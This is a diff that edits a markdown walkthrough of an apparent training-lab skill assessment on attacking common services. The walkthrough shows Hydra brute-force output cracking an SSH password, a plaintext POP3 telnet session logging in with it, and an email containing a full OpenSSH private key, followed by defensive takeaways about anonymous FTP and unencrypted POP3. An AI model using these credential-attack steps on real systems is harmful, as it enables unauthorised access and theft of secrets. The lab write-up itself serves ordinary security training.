@@ -6,6 +6,8 @@
 
 [Main Page](/index)
 
+# Attacking Common Services Skill Assessment - Medium
+
 > The second server is an internal server (within the inlanefreight.htb domain) that manages and stores emails and files and serves as a backup of some of the company's processes. From internal conversations, we heard that this is used relatively rarely and, in most cases, has only been used for testing purposes so far.
 
 Let's start with an nmap scan. I first like to run an nmap similar to this to quickly enumerate all open ports:
@@ -233,7 +235,7 @@ Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2025-02-02 18:04:
 [WARNING] Many SSH configurations limit the number of parallel tasks, it is recommended to reduce the tasks: use -t 4
 [DATA] max 8 tasks per 1 server, overall 8 tasks, 8 login tries (l:1/p:8), ~1 try per task
 [DATA] attacking ssh://10.129.201.127:22/
-[22][ssh] host: 10.129.201.127   login: simon   password: **8Ns8j1b!23hs4921smHzwn**
+[22][ssh] host: 10.129.201.127   login: simon   password: 8Ns8j1b!23hs4921smHzwn
 1 of 1 target successfully completed, 1 valid password found
 Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2025-02-02 18:04:34
 ```
@@ -253,10 +255,11 @@ simon@lin-medium:~$ ls
 flag.txt  Maildir
 ```
 
-Righteous! We got our flag. However, I can't helpp but peek a gander at the `Maildir`.
+Righteous! We got our flag. However, I can't help but peek a gander at the `Maildir`.
 
 ```
-simon@lin-medium:~/Maildir/.INBOX/cur$ cat simon\:2\,S                                                                  From admin@inlanefreight.htb  Mon Apr 18 19:36:10 2022
+simon@lin-medium:~/Maildir/.INBOX/cur$ cat simon\:2\,S
+From admin@inlanefreight.htb  Mon Apr 18 19:36:10 2022
 Return-Path: <root@inlanefreight.htb>
 X-Original-To: simon@inlanefreight.htb
 Delivered-To: simon@inlanefreight.htb
@@ -292,7 +295,20 @@ Just as I suspected. Let's see if we can find that email.
 
 ```
 $ telnet 10.129.201.127 110                                                                                           
-Trying 10.129.201.127...                                                                                                Connected to 10.129.201.127.                                                                                            Escape character is '^]'.                                                                                               +OK Dovecot (Ubuntu) ready.                                                                                             USER simon                                                                                                              +OK                                                                                                                     PASS 8Ns8j1b!23hs4921smHzwn                                                                                             +OK Logged in.                                                                                                          list                                                                                                                    +OK 1 messages:                                                                                                         1 1630                                                                                                                  .                                                                                                                       retr 1                                                                                                                  +OK 1630 octets
+Trying 10.129.201.127...
+Connected to 10.129.201.127.
+Escape character is '^]'.
++OK Dovecot (Ubuntu) ready.
+USER simon
++OK
+PASS 8Ns8j1b!23hs4921smHzwn
++OK Logged in.
+LIST 1
++OK 1 messages:
+1 1630
+.
+retr 1
++OK 1630 octets
 From admin@inlanefreight.htb  Mon Apr 18 19:36:10 2022
 Return-Path: <root@inlanefreight.htb>
 X-Original-To: simon@inlanefreight.htb
@@ -312,7 +328,7 @@ Here is your new key Simon. Enjoy and have a nice day..
  -----BEGIN OPENSSH PRIVATE KEY----- b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAAAlwAAAAdzc2gtcn NhAAAAAwEAAQAAAIEN11i6S5a2WTtRlu2BG8nQ7RKBtK0AgOlREm+mfdZWpPn0HEvl92S4 4W1H2nKwAWwZIBlUmw4iUqoGjib5KvN7H4xapGWIc5FPb/FVI64DjMdcUNlv5GZ38M1yKm w5xKGD/5xEWZt6tofpgYLUNxK62zh09IfbEOORkc5J9z2jUpEAAAIITrtUA067VAMAAAAH c3NoLXJzYQAAAIEN11i6S5a2WTtRlu2BG8nQ7RKBtK0AgOlREm+mfdZWpPn0HEvl92S44W 1H2nKwAWwZIBlUmw4iUqoGjib5KvN7H4xapGWIc5FPb/FVI64DjMdcUNlv5GZ38M1yKmw5 xKGD/5xEWZt6tofpgYLUNxK62zh09IfbEOORkc5J9z2jUpEAAAADAQABAAAAgQe3Qpknxi 6E89J55pCQoyK65hQ0WjTrqCUvt9oCUFggw85Xb+AU16tQz5C8sC55vH8NK9HEVk6/8lSR Lhy82tqGBfgGfvrx5pwPH9a5TFhxnEX/GHIvXhR0dBlbhUkQrTqOIc1XUdR+KjR1j8E0yi ZA4qKw1pK6BQLkHaCd3csBoQAAAEECeVZIC1Pq6T8/PnIHj0LpRcR8dEN0681+OfWtcJbJ hAWVrZ1wrgEg4i75wTgud5zOTV07FkcVXVBXSaWSPbmR7AAAAEED81FX7PttXnG6nSCqjz B85dsxntGw7C232hwgWVPM7DxCJQm21pxAwSLxp9CU9wnTwrYkVpEyLYYHkMknBMK0/QAA AEEDgPIA7TI4F8bPjOwNlLNulbQcT5amDp51fRWapCq45M7ptN4pTGrB97IBKPTi5qdodg O9Tm1rkjQ60Ty8OIjyJQAAABBzaW1vbkBsaW4tbWVkaXVtAQ== -----END OPENSSH PRIVATE KEY-----
 ```
 
-It worked! So instead of going straight for SSH we could've gone at pop3 and grabbed this private key. Some takeaways are don't allow anonymous login on FTP, don't write down your passwords anywhere accessible to others, and probably don't email a private key (and story a copy of said email) with an unencrypted service like pop3. As we could see in the nmap output, there was pop3s running aswell. However, best practice is to disable base pop3 as it sends everything like usernames, passwords, and retreived emails in plain text. We could've viewed the same email over pop3s by connecting with openssl like this:
+It worked! So instead of going straight for SSH we could've gone at pop3 and grabbed this private key. Some takeaways are don't allow anonymous login on FTP, don't write down your passwords anywhere accessible to others, and probably don't email a private key (and story a copy of said email) with an unencrypted service like pop3. As we could see in the nmap output, there was pop3s running aswell. However, best practice is to disable regular pop3 as it sends everything like usernames, passwords, and retreived emails in plain text. We could've viewed the same email over pop3s by connecting with openssl like this:
 
 ```
 openssl s_client -connect 10.129.201.127:995
